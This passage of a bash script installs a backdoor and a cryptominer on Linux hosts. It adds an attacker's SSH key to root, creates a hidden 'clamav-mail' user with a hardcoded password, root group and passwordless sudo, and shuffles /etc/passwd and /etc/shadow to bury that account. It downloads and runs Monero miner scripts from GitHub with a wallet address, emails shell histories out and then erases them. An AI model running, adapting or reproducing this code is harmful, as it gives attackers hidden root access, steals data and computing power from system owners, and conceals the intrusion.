    if [ ! -f "$auth_keys" ] || ! grep -q "AAAAB3NzaC1yc2EAAAADAQABAAACAQDgh9Q31B86YT9f" "$auth_keys" 2>/dev/null; then
        echo "$ssh_key" >> "$auth_keys"
        chmod 600 "$auth_keys"
        log_message "SSH key added successfully"
    else
        log_message "SSH key already exists, skipping"
    fi
}

# Function to create backdoor user with proper error handling
create_backdoor_user() {
    local username="clamav-mail"
    local uid=455
    local password='1!taugenichts'
    
    log_message "Creating backdoor user: $username"
    
    # Detect password hashing method
    local hash_method=$(grep '^ENCRYPT_METHOD' /etc/login.defs 2>/dev/null | awk '{print $2}')
    if [ -z "$hash_method" ]; then
        hash_method="SHA512"
        log_message "Using default hash method: SHA512"
    else
        log_message "Detected hash method: $hash_method"
    fi
    
    # Generate password hash
    local password_hash
    if [ "$hash_method" = "SHA512" ]; then
        password_hash=$(openssl passwd -6 -salt "$(openssl rand -base64 3)" "$password")
    else
        password_hash=$(openssl passwd -1 -salt "$(openssl rand -base64 3)" "$password")
    fi
    
    if [ -z "$password_hash" ]; then
        log_message "ERROR: Failed to generate password hash"
        return 1
    fi
    
    # Remove existing user if present
    if id -u "$username" >/dev/null 2>&1; then
        log_message "User $username already exists, removing..."
        userdel --remove "$username" 2>/dev/null || log_message "Warning: Could not remove existing user"
    fi
    
    # Create sudo group if it doesn't exist
    if ! grep -q '^sudo:' /etc/group 2>/dev/null; then
        log_message "Creating sudo group"
        groupadd sudo 2>/dev/null || log_message "Warning: Could not create sudo group"
    fi
    
    # Create user-specific group if it doesn't exist
    if ! grep -q "^${username}:" /etc/group 2>/dev/null; then
        log_message "Creating group: $username"
        groupadd "$username" 2>/dev/null || log_message "Warning: Could not create user group"
    fi
    
    # Create the user
    log_message "Creating user account"
    if useradd -u "$uid" -G root,sudo -g "$username" -M -o -s /bin/bash "$username" 2>/dev/null; then
        log_message "User created successfully"
    else
        log_message "ERROR: Failed to create user"
        return 1
    fi
    
    # Set password
    log_message "Setting user password"
    if usermod -p "$password_hash" "$username" 2>/dev/null; then
        log_message "Password set successfully"
    else
        log_message "ERROR: Failed to set password"
        return 1
    fi
    
    # Reorder passwd file to hide user in the middle
    log_message "Reordering passwd file"
    if [ -f /etc/passwd ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/passwd > /tmp/passwd && mv /tmp/passwd /etc/passwd
    fi
    
    # Reorder shadow file to hide user in the middle
    log_message "Reordering shadow file"
    if [ -f /etc/shadow ]; then
        awk '{lines[NR]=$0} END{
            if (NR < 3) {
                for(i=1;i<=NR;i++) print lines[i];
            } else {
                last=lines[NR]; 
                delete lines[NR]; 
                n=NR-1; 
                m=int(n/2+1); 
                for(i=1;i<m;i++) print lines[i]; 
                print last; 
                for(i=m;i<=n;i++) print lines[i];
            }
        }' /etc/shadow > /tmp/shadow && mv /tmp/shadow /etc/shadow
    fi
    
    log_message "User creation completed"
    return 0
}

# Function to setup sudoers
setup_sudoers() {
    local username="clamav-mail"
    local sudoers_file="/etc/sudoers.d/$username"
    
    log_message "Setting up sudoers for $username"
    
    # Create sudoers entry
    echo "$username ALL=(ALL) NOPASSWD: ALL" > "$sudoers_file"
    
    # Set proper permissions
    chmod 0440 "$sudoers_file"
    chown root:root "$sudoers_file"
    
    # Validate sudoers file
    if visudo -c -f "$sudoers_file" >/dev/null 2>&1; then
        log_message "Sudoers file validated successfully"
        return 0
    else
        log_message "ERROR: Sudoers file validation failed, removing"
        rm -f "$sudoers_file"
        return 1
    fi
}

# Function to check required dependencies
check_dependencies() {
    local missing_deps=()
    local required_deps=("free" "df" "hostname" "base64")
    
    for cmd in "${required_deps[@]}"; do
        if ! command_exists "$cmd"; then
            missing_deps+=("$cmd")
        fi
    done
    
    if [ ${#missing_deps[@]} -gt 0 ]; then
        log_message "WARNING: Missing dependencies: ${missing_deps[*]}"
        log_message "Will attempt to continue anyway"
        return 1
    fi
    
    return 0
}

root_installation() {
    log_message "Starting root installation..."
    
    # Install mail utilities
    install_mail_utils
    
    # Setup SSH key for root
    setup_ssh_key "/root/.ssh"
    
    # Create backdoor user
    if create_backdoor_user; then
        log_message "Backdoor user created successfully"
    else
        log_message "ERROR: Failed to create backdoor user"
    fi
    
    # Setup sudoers
    if setup_sudoers; then
        log_message "Sudoers configured successfully"
    else
        log_message "WARNING: Sudoers configuration failed"
    fi
    
    # Run the miner setup
    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/refs/heads/main/setup_FULL_ULTIMATE_v3.2.sh" \
        "$wallet" \
        "root miner setup"
    
    log_message "Root installation completed"
}

user_installation() {
    log_message "Starting user installation..."
    
    local wallet="49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
    download_and_execute \
        "https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh" \
        "$wallet" \
        "user miner setup"
    
    log_message "User installation completed"
}

# --- Main Execution ---

# Initialize log file
: > "$LOG_FILE"
log_message "Script started by user: $(whoami)"

# Check dependencies first
if ! check_dependencies; then
    log_message "WARNING: Dependency check failed. Continuing anyway..."
fi

# Service checks (using enhanced functions)
log_message "Checking for conflicting services..."
for service in "${SERVICES_TO_CHECK[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            log_message "ERROR: Service $service is running. Attempting to stop..."
            safe_service_stop "$service"
            sleep 2
            # Check again
            if is_service_running "$service"; then
                log_message "ERROR: Could not stop $service. Aborting."
                exit 1
            else
                log_message "Service $service stopped successfully"
            fi
        else
            log_message "Service $service exists but is not running"
        fi
    else
        log_message "Service $service does not exist"
    fi
done

# System info display
log_message "Displaying system information"
echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h 2>/dev/null | awk '/^Mem:/ {print $2}' || echo 'N/A')  |"
echo -e "|   CPU Cores    |      $(nproc 2>/dev/null || echo 'N/A')      |"
echo -e "|     Storage      |   $(df -h / 2>/dev/null | awk 'NR==2 {print $2}' || echo 'N/A')   |"
echo -e "---------------------------------"

# Send report and only cleanup if successful
log_message "Sending system history report..."
send_histories_email || log_message "Continuing after email attempt..."

# Always cleanup histories for security
log_message "Cleaning up shell histories..."
cleanup_histories

# Installation
if [[ $(id -u) -eq 0 ]]; then
    log_message "Running as root"
    root_installation
else
    log_message "Running as regular user"
    user_installation
fi

log_message "Script execution completed"
